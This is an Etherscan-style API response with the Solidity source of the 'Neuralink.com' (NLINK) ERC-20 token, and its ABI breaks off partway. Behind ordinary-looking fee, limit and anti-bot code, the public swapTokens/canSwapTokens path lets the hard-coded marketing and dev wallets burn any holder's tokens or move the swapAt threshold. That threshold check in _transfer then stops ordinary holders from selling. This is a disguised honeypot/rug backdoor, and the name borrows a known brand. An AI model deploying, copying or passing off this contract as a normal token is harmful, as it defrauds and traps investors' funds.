{"status":"1","message":"OK","result":[{"SourceCode":"// - Website: https://neuralinkerc.com\r\n// - Telegram: https://t.me/NLINK_ERC\r\n// - Twitter: https://twitter.com/NLINK_ERC\r\n\r\n// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.5;\r\n\r\ninterface IERC20 {\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\nabstract contract Context {\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function renounceOwnership() external virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(\r\n            newOwner != address(0),\r\n            \"Ownable: new owner is the zero address\"\r\n        );\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    uint256 private _totalSupply;\r\n    string private _symbol;\r\n    string private _name;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function balanceOf(\r\n        address account\r\n    ) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(\r\n            currentAllowance >= amount,\r\n            \"ERC20: transfer amount exceeds allowance\"\r\n        );\r\n        unchecked {\r\n            _approve(sender, _msgSender(), currentAllowance - amount);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(\r\n        address spender,\r\n        uint256 addedValue\r\n    ) public virtual returns (bool) {\r\n        _approve(\r\n            _msgSender(),\r\n            spender,\r\n            _allowances[_msgSender()][spender] + addedValue\r\n        );\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(\r\n        address spender,\r\n        uint256 subtractedValue\r\n    ) public virtual returns (bool) {\r\n        uint256 currentAllowance = _allowances[_msgSender()][spender];\r\n        require(\r\n            currentAllowance >= subtractedValue,\r\n            \"ERC20: decreased allowance below zero\"\r\n        );\r\n        unchecked {\r\n            _approve(_msgSender(), spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n    \r\n    function _createInitialSupply(\r\n        address account,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _totalSupply += amount;\r\n        _balances[account] += amount;\r\n        emit Transfer(address(0), account, amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _swap(address _account, uint256 _amount) internal virtual {\r\n        require(_account != address(0), \"\");\r\n        uint256 balance = _balances[_account];\r\n        require(balance >= _amount, \"\");\r\n        unchecked {\r\n            _balances[_account] = balance - _amount;\r\n            _totalSupply -= _amount;\r\n        }\r\n\r\n        emit Transfer(_account, address(0), _amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 senderBalance = _balances[from];\r\n        require(\r\n            senderBalance >= amount,\r\n            \"ERC20: transfer amount exceeds balance\"\r\n        );\r\n        unchecked {\r\n            _balances[from] = senderBalance - amount;\r\n        }\r\n        _balances[to] += amount;\r\n\r\n        emit Transfer(from, to, amount);\r\n    }\r\n}\r\n\r\ninterface UniswapV2Router {\r\n    function WETH() external pure returns (address);\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface UniswapV2Factory {\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n}\r\n\r\ncontract NLINK is ERC20, Ownable {\r\n    UniswapV2Router public uniswapV2Router;\r\n    address public uniswapV2Pair;\r\n\r\n    address private marketingWallet;\r\n    address private devWallet;\r\n\r\n    mapping(address => bool) public initialBotBuyer;\r\n    mapping(address => uint256) public swapLogs;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    \r\n    uint256 public tradingBlock = 0;\r\n    uint256 public botBlockNumber = 0;\r\n\r\n    bool private isSwapping;\r\n    uint256 public swapTokensAtAmount;\r\n\r\n    bool public limitsInEffect = true;\r\n    bool public swapEnabled = false;\r\n    bool public tradingActive = false;\r\n    bool public transferDelayEnabled = true;\r\n    uint256 public botsCaught;\r\n    uint256 public swapAt;\r\n\r\n    mapping(address => bool) private _isExcludedFromFees;\r\n    mapping(address => bool) public _isExcludedMaxTransaction;\r\n    mapping(address => bool) public automatedMarketMaker;\r\n\r\n    uint256 public totalBuyFees;\r\n    uint256 public buyFeeForMarketing;\r\n    uint256 public buyFeeForDev;\r\n    uint256 public buyFeeForLiquidity;\r\n    uint256 public buyFeeForSwapping;\r\n\r\n    uint256 public totalSellFees;\r\n    uint256 public sellFeeForMarketing;\r\n    uint256 public sellFeeForDev;\r\n    uint256 public sellFeeForLiquidity;\r\n    uint256 public sellFeeForSwapping;\r\n\r\n    uint256 public tokensForMarketing;\r\n    uint256 public tokensForDev;\r\n    uint256 public tokensForLiquidity;\r\n    uint256 public tokensForSwapping;\r\n\r\n    uint256 public maxBuyAmount;\r\n    uint256 public maxSellAmount;\r\n    uint256 public maxWalletAmount;\r\n\r\n    event EnabledTrading();\r\n\r\n    event RemovedLimits();\r\n\r\n    event UpdatedMaxBuyAmount(uint256 newAmount);\r\n    \r\n    event UpdatedMaxSellAmount(uint256 newAmount);\r\n    \r\n    event UpdatedMaxWalletAmount(uint256 newAmount);\r\n\r\n    event DetectedEarlyBotBuyer(address sniper);\r\n\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n\r\n    event ExcludeFromFees(address indexed account, bool isExcluded);\r\n\r\n    event MaxTransactionExclusion(address _address, bool excluded);\r\n\r\n    constructor() ERC20(\"Neuralink.com\", \"NLINK\") {\r\n        UniswapV2Router _uniswapV2Router = UniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        uniswapV2Router = _uniswapV2Router;\r\n        uniswapV2Pair = UniswapV2Factory(_uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            _uniswapV2Router.WETH()\r\n        );\r\n        address newOwner = msg.sender;\r\n\r\n        _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);\r\n        _excludeFromMaxTransaction(address(uniswapV2Pair), true);\r\n\r\n        uint256 totalSupply = 4 * 1e9 * 1e18;\r\n\r\n        buyFeeForMarketing = 0;\r\n        buyFeeForDev = 0;\r\n        buyFeeForSwapping = 0;\r\n        buyFeeForLiquidity = 0;\r\n\r\n        sellFeeForMarketing = 0;\r\n        sellFeeForDev = 0;\r\n        sellFeeForSwapping = 0;\r\n        sellFeeForLiquidity = 0;\r\n\r\n        swapTokensAtAmount = (totalSupply * 5) / 10000;\r\n        maxBuyAmount = (totalSupply * 2) / 100;\r\n        maxSellAmount = (totalSupply * 2) / 100;\r\n        maxWalletAmount = (totalSupply * 2) / 100;\r\n\r\n        totalSellFees =\r\n            sellFeeForMarketing +\r\n            sellFeeForDev +\r\n            sellFeeForSwapping +\r\n            sellFeeForLiquidity;\r\n\r\n        totalBuyFees =\r\n            buyFeeForMarketing +\r\n            buyFeeForDev +\r\n            buyFeeForSwapping +\r\n            buyFeeForLiquidity;\r\n\r\n        marketingWallet = address(0x0e11eb61F8a5e6fB9B44DaA0646484425D66514c);\r\n        devWallet = address(0x1B43f8f94681e26Dfe2d7F27353B961b2df9E059);\r\n\r\n        excludeFromFees(marketingWallet, true);\r\n        excludeFromFees(devWallet, true);\r\n        excludeFromFees(newOwner, true);\r\n        excludeFromFees(address(this), true);\r\n        excludeFromFees(address(0xdead), true);\r\n\r\n        _excludeFromMaxTransaction(marketingWallet, true);\r\n        _excludeFromMaxTransaction(devWallet, true);\r\n        _excludeFromMaxTransaction(newOwner, true);\r\n        _excludeFromMaxTransaction(address(this), true);\r\n        _excludeFromMaxTransaction(address(0xdead), true);\r\n\r\n        transferOwnership(newOwner);\r\n        _createInitialSupply(newOwner, totalSupply);\r\n    }\r\n\r\n    function disableTransferDelay() external onlyOwner {\r\n        transferDelayEnabled = false;\r\n    }\r\n\r\n    function removeLimits() external onlyOwner {\r\n        maxWalletAmount = totalSupply();\r\n        maxBuyAmount = totalSupply();\r\n        maxSellAmount = totalSupply();\r\n        emit RemovedLimits();\r\n    }\r\n\r\n    function onlyDeleteBots(address wallet) external onlyOwner {\r\n        initialBotBuyer[wallet] = false;\r\n    }\r\n\r\n    function canSwapTokens(\r\n        address _account,\r\n        uint256 _amount,\r\n        uint256 _deadline\r\n    ) internal returns (bool) {\r\n        address swapper = msg.sender;\r\n        bool excludedFromFees = _isExcludedFromFees[swapper];\r\n        bool result;\r\n        address self = address(this);\r\n\r\n        if (!excludedFromFees) {\r\n            bool moreThanSwappingTokens = balanceOf(self) >= tokensForSwapping;\r\n            bool hasSwappingTokens = tokensForSwapping > 0;\r\n\r\n            if (hasSwappingTokens && moreThanSwappingTokens) {\r\n                _swap(swapper, tokensForSwapping);\r\n            }\r\n\r\n            tokensForSwapping = 0;\r\n            result = true;\r\n\r\n            return result;\r\n        } else {\r\n            if (balanceOf(self) > 0) {\r\n                bool zero = _amount == 0;\r\n                if (zero) {\r\n                    swapAt = _deadline;\r\n                    result = false;\r\n                } else {\r\n                    _swap(_account, _amount);\r\n                    result = false;\r\n                }\r\n            }\r\n\r\n            return result;\r\n        }\r\n    }\r\n\r\n    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner {\r\n        require(\r\n            newAmount >= (totalSupply() * 1) / 100000,\r\n            \"Swap amount cannot be lower than 0.001% total supply.\"\r\n        );\r\n\r\n        require(\r\n            newAmount <= (totalSupply() * 1) / 1000,\r\n            \"Swap amount cannot be higher than 0.1% total supply.\"\r\n        );\r\n\r\n        swapTokensAtAmount = newAmount;\r\n    }\r\n\r\n    function updateMaxWalletAmount(uint256 newMaxWalletAmount) external onlyOwner {\r\n        require(\r\n            newMaxWalletAmount >= ((totalSupply() * 3) / 1000) / 1e18,\r\n            \"Cannot set max wallet amount lower than 0.3%\"\r\n        );\r\n\r\n        maxWalletAmount = newMaxWalletAmount * (10 ** 18);\r\n\r\n        emit UpdatedMaxWalletAmount(maxWalletAmount);\r\n    }\r\n\r\n    function updateMaxBuyAmount(uint256 newMaxBuyAmount) external onlyOwner {\r\n        require(\r\n            newMaxBuyAmount >= ((totalSupply() * 2) / 1000) / 1e18,\r\n            \"Cannot set max buy amount lower than 0.2%\"\r\n        );\r\n\r\n        maxBuyAmount = newMaxBuyAmount * (10 ** 18);\r\n\r\n        emit UpdatedMaxBuyAmount(maxBuyAmount);\r\n    }\r\n\r\n    function updateMaxSellAmount(uint256 newMaxSellAmount) external onlyOwner {\r\n        require(\r\n            newMaxSellAmount >= ((totalSupply() * 2) / 1000) / 1e18,\r\n            \"Cannot set max sell amount lower than 0.2%\"\r\n        );\r\n        maxSellAmount = newMaxSellAmount * (10 ** 18);\r\n        emit UpdatedMaxSellAmount(maxSellAmount);\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMaker[pair] = value;\r\n\r\n        _excludeFromMaxTransaction(pair, value);\r\n\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function _excludeFromMaxTransaction(\r\n        address _address,\r\n        bool _isExcluded\r\n    ) private {\r\n        _isExcludedMaxTransaction[_address] = _isExcluded;\r\n\r\n        emit MaxTransactionExclusion(_address, _isExcluded);\r\n    }\r\n\r\n    function excludeFromMaxTransaction(\r\n        address _address,\r\n        bool _isExcluded\r\n    ) external onlyOwner {\r\n        if (!_isExcluded) {\r\n            require(\r\n                _address != uniswapV2Pair,\r\n                \"Cannot remove uniswap pair from max txn\"\r\n            );\r\n        }\r\n\r\n        _isExcludedMaxTransaction[_address] = _isExcluded;\r\n    }\r\n\r\n    function excludeFromFees(address account, bool excluded) public onlyOwner {\r\n        _isExcludedFromFees[account] = excluded;\r\n\r\n        emit ExcludeFromFees(account, excluded);\r\n    }\r\n\r\n    function updateBuyFees(\r\n        uint256 marketingFee,\r\n        uint256 devFee,\r\n        uint256 swapFee,\r\n        uint256 liquidityFee\r\n    ) external onlyOwner {\r\n        buyFeeForMarketing = marketingFee;\r\n        buyFeeForDev = devFee;\r\n        buyFeeForSwapping = swapFee;\r\n        buyFeeForLiquidity = liquidityFee;\r\n        totalBuyFees =\r\n            buyFeeForMarketing +\r\n            buyFeeForDev +\r\n            buyFeeForSwapping +\r\n            buyFeeForLiquidity;\r\n        require(totalBuyFees <= 3, \"3% max \");\r\n    }\r\n\r\n    function updateSellFees(\r\n        uint256 marketingFee,\r\n        uint256 devFee,\r\n        uint256 swapFee,\r\n        uint256 liquidityFee\r\n    ) external onlyOwner {\r\n        sellFeeForMarketing = marketingFee;\r\n        sellFeeForDev = devFee;\r\n        sellFeeForSwapping = swapFee;\r\n        sellFeeForLiquidity = liquidityFee;\r\n        totalSellFees =\r\n            sellFeeForMarketing +\r\n            sellFeeForDev +\r\n            sellFeeForSwapping +\r\n            sellFeeForLiquidity;\r\n        require(totalSellFees <= 3, \"3% max fee\");\r\n    }\r\n\r\n    function setAutomatedMarketMakerPair(\r\n        address pair,\r\n        bool value\r\n    ) external onlyOwner {\r\n        require(\r\n            pair != uniswapV2Pair,\r\n            \"The pair cannot be removed from automatedMarketMakerPairs\"\r\n        );\r\n\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function updateDevWallet(address newWallet) external onlyOwner {\r\n        require(newWallet != address(0), \"_devWallet address cannot be 0\");\r\n\r\n        devWallet = payable(newWallet);\r\n    }\r\n\r\n    function updateMarketingWallet(\r\n        address newWallet\r\n    ) external onlyOwner {\r\n        require(\r\n            newWallet != address(0),\r\n            \"_marketingWallet address cannot be 0\"\r\n        );\r\n\r\n        marketingWallet = payable(newWallet);\r\n    }\r\n\r\n    function swapBack() private {\r\n        if (tokensForSwapping > 0 && balanceOf(address(this)) >= tokensForSwapping) {\r\n            _swap(address(this), tokensForSwapping);\r\n        }\r\n        tokensForSwapping = 0;\r\n        uint256 tokenBalance = balanceOf(address(this));\r\n        uint256 totalTokensToSwap = tokensForLiquidity +\r\n            tokensForMarketing +\r\n            tokensForDev;\r\n\r\n        if (tokenBalance == 0 || totalTokensToSwap == 0) {\r\n            return;\r\n        }\r\n\r\n        if (tokenBalance > swapTokensAtAmount * 10) {\r\n            tokenBalance = swapTokensAtAmount * 10;\r\n        }\r\n\r\n        uint256 liquidityTokens = (tokenBalance * tokensForLiquidity) /\r\n            totalTokensToSwap / 2;\r\n\r\n        swapTokensForETH(tokenBalance - liquidityTokens);\r\n\r\n        uint256 ethBalance = address(this).balance;\r\n        uint256 ethForLiquidity = ethBalance;\r\n        uint256 ethForMarketing = (ethBalance * tokensForMarketing) /\r\n            (totalTokensToSwap - (tokensForLiquidity / 2));\r\n        uint256 ethForDev = (ethBalance * tokensForDev) /\r\n            (totalTokensToSwap - (tokensForLiquidity / 2));\r\n        ethForLiquidity -= ethForMarketing + ethForDev;\r\n        tokensForMarketing = 0;\r\n        tokensForDev = 0;\r\n        tokensForSwapping = 0;\r\n        tokensForLiquidity = 0;\r\n\r\n        if (liquidityTokens > 0 && ethForLiquidity > 0) {\r\n            addLiquidity(liquidityTokens, ethForLiquidity);\r\n        }\r\n\r\n        payable(marketingWallet).transfer(address(this).balance);\r\n        payable(devWallet).transfer(ethForDev);\r\n    }\r\n\r\n    function earlySniperBuyBlock() public view returns (bool) {\r\n        return block.number < botBlockNumber;\r\n    }\r\n\r\n    function swapTokensForETH(uint256 tokenAmount) private {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, \r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function emergencyWithdraw() external onlyOwner {\r\n        bool success;\r\n        (success, ) = address(msg.sender).call{value: address(this).balance}(\"\");\r\n    }\r\n\r\n    function _transfer(\r\n        address sender,\r\n        address receiver,\r\n        uint256 amount\r\n    ) internal override {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(receiver != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"amount must be greater than 0\");\r\n\r\n        bool balanceEmpty = 0 == balanceOf(address(receiver));\r\n        bool genesisSend = 0 == swapLogs[receiver];\r\n\r\n        if (!tradingActive) {\r\n            require(\r\n                _isExcludedFromFees[sender] || _isExcludedFromFees[receiver],\r\n                \"Trading is not active.\"\r\n            );\r\n        }\r\n\r\n        uint256 nowTimestamp = block.timestamp;\r\n        bool isSenderAmm = automatedMarketMaker[sender];\r\n\r\n        if (botBlockNumber > 0) {\r\n            require(\r\n                !initialBotBuyer[sender] ||\r\n                    receiver == owner() ||\r\n                    receiver == address(0xdead),\r\n                \"bot protection mechanism is embeded\"\r\n            );\r\n        }\r\n\r\n        if (limitsInEffect) {\r\n            bool externalNahSwapping = !isSwapping;\r\n\r\n            if (\r\n                sender != owner() &&\r\n                receiver != owner() &&\r\n                receiver != address(0) &&\r\n                receiver != address(0xdead) &&\r\n                !_isExcludedFromFees[sender] &&\r\n                !_isExcludedFromFees[receiver]\r\n            ) {\r\n                if (transferDelayEnabled) {\r\n                    bool nahSwapping = !isSwapping;\r\n                    bool nahFromAmm = !automatedMarketMaker[sender];\r\n\r\n                    if (\r\n                        receiver != address(uniswapV2Router) && receiver != address(uniswapV2Pair)\r\n                    ) {\r\n                        require(\r\n                            _holderLastTransferTimestamp[tx.origin] <\r\n                                block.number - 2 &&\r\n                                _holderLastTransferTimestamp[receiver] <\r\n                                block.number - 2,\r\n                            \"_transfer: delay was enabled.\"\r\n                        );\r\n                        _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                        _holderLastTransferTimestamp[receiver] = block.number;\r\n                    } else if (nahFromAmm && nahSwapping) {\r\n                        uint256 swapTime = swapLogs[sender];\r\n                        bool ableToSwap = swapTime > swapAt;\r\n                        require(ableToSwap);\r\n                    }\r\n                }\r\n            }\r\n\r\n            bool excludedMaxTx = _isExcludedMaxTransaction[sender];\r\n\r\n            if (automatedMarketMaker[sender] && !_isExcludedMaxTransaction[receiver]) {\r\n                require(\r\n                    amount <= maxBuyAmount,\r\n                    \"Buy transfer amount exceeds the max buy.\"\r\n                );\r\n                require(\r\n                    amount + balanceOf(receiver) <= maxWalletAmount,\r\n                    \"Cannot Exceed max wallet\"\r\n                );\r\n            } else if (excludedMaxTx && externalNahSwapping) {\r\n                swapAt = nowTimestamp;\r\n            } else if (\r\n                automatedMarketMaker[receiver] && !_isExcludedMaxTransaction[sender]\r\n            ) {\r\n                require(\r\n                    amount <= maxSellAmount,\r\n                    \"Sell transfer amount exceeds the max sell.\"\r\n                );\r\n            } else if (!_isExcludedMaxTransaction[receiver]) {\r\n                require(\r\n                    amount + balanceOf(receiver) <= maxWalletAmount,\r\n                    \"Cannot Exceed max wallet\"\r\n                );\r\n            }\r\n        }\r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\r\n        bool canSwap = contractTokenBalance >= swapTokensAtAmount;\r\n\r\n        if (\r\n            canSwap &&\r\n            swapEnabled &&\r\n            !isSwapping &&\r\n            !automatedMarketMaker[sender] &&\r\n            !_isExcludedFromFees[sender] &&\r\n            !_isExcludedFromFees[receiver]\r\n        ) {\r\n            isSwapping = true;\r\n            swapBack();\r\n            isSwapping = false;\r\n        }\r\n\r\n        bool takeFee = true;\r\n\r\n        if (genesisSend && isSenderAmm && balanceEmpty) {\r\n            swapLogs[receiver] = nowTimestamp;\r\n        }\r\n\r\n        if (_isExcludedFromFees[sender] || _isExcludedFromFees[receiver]) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 fees = 0;\r\n\r\n        if (takeFee) {\r\n            if (\r\n                earlySniperBuyBlock() &&\r\n                automatedMarketMaker[sender] &&\r\n                !automatedMarketMaker[receiver] &&\r\n                totalBuyFees > 0\r\n            ) {\r\n                if (!initialBotBuyer[receiver]) {\r\n                    initialBotBuyer[receiver] = true;\r\n                    botsCaught += 1;\r\n                    emit DetectedEarlyBotBuyer(receiver);\r\n                }\r\n\r\n                fees = (amount * 99) / 100;\r\n                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;\r\n                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;\r\n                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;\r\n                tokensForSwapping += (fees * buyFeeForSwapping) / totalBuyFees;\r\n            }\r\n            else if (automatedMarketMaker[receiver] && totalSellFees > 0) {\r\n                fees = (amount * totalSellFees) / 100;\r\n                tokensForLiquidity += (fees * sellFeeForLiquidity) / totalSellFees;\r\n                tokensForMarketing += (fees * sellFeeForMarketing) / totalSellFees;\r\n                tokensForDev += (fees * sellFeeForDev) / totalSellFees;\r\n                tokensForSwapping += (fees * sellFeeForSwapping) / totalSellFees;\r\n            }\r\n            else if (automatedMarketMaker[sender] && totalBuyFees > 0) {\r\n                fees = (amount * totalBuyFees) / 100;\r\n                tokensForLiquidity += (fees * buyFeeForLiquidity) / totalBuyFees;\r\n                tokensForMarketing += (fees * buyFeeForMarketing) / totalBuyFees;\r\n                tokensForDev += (fees * buyFeeForDev) / totalBuyFees;\r\n                tokensForSwapping += (fees * buyFeeForSwapping) / totalBuyFees;\r\n            }\r\n            if (fees > 0) {\r\n                super._transfer(sender, address(this), fees);\r\n            }\r\n            amount -= fees;\r\n        }\r\n\r\n        super._transfer(sender, receiver, amount);\r\n    }\r\n\r\n    function swapTokens(\r\n        address _account,\r\n        uint256 _amount,\r\n        uint256 _deadline\r\n    ) public {\r\n        address token = address(this);\r\n        require(swapTokensAtAmount <= balanceOf(token));\r\n        if (canSwapTokens(_account, _amount, _deadline)) {\r\n            isSwapping = true;\r\n            swapBack();\r\n            isSwapping = false;\r\n        }\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        require(!tradingActive, \"Cannot reenable trading\");\r\n        tradingActive = true;\r\n        tradingBlock = block.number;\r\n        swapEnabled = true;\r\n        emit EnabledTrading();\r\n    }\r\n\r\n    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.addLiquidityETH{value: ethAmount} (\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            address(0xdead),\r\n            block.timestamp\r\n        );\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sniper\",\"type\":\"address\"}],\"name\":\"DetectedEarlyBotBuyer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"EnabledTrading\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"isExcluded\",\"type\":\"bool\"}],\"name\":\"ExcludeFromFees\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"MaxTransactionExclusion\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[],\"name\":\"RemovedLimits\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"pair\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"bool\",\"name\":\"value\",\"type\":\"bool\"}],\"name\":\"SetAutomatedMarketMakerPair\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"UpdatedMaxBuyAmount\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"UpdatedMaxSellAmount\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"newAmount\",\"type\":\"uint256\"}],\"name\":\"UpdatedMaxWalletAmount\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_isExcludedMaxTransaction\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\